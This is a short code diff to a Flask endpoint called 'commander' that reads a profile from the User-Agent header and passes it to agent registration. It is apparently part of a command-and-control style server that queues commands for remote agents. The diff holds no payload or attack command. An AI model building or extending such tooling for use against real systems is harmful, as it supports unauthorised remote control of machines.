@@ -28,9 +28,11 @@ def send_command():
 def commander():
     if request.method == 'GET':
         uuid = request.args.get('uuid')
+        raw_profile = request.headers.get("User-Agent").split("/", 1)
+        profile = raw_profile[0]
         cache = r.lindex(uuid, -1)
         if r.exists(uuid) == 0:
-            command = register_agent(uuid, db_path)
+            command = register_agent(uuid, profile, db_path)
 
         elif "SEEN" in cache or "AGENT REGISTERED" in cache:
             update_seen(uuid, db_path)
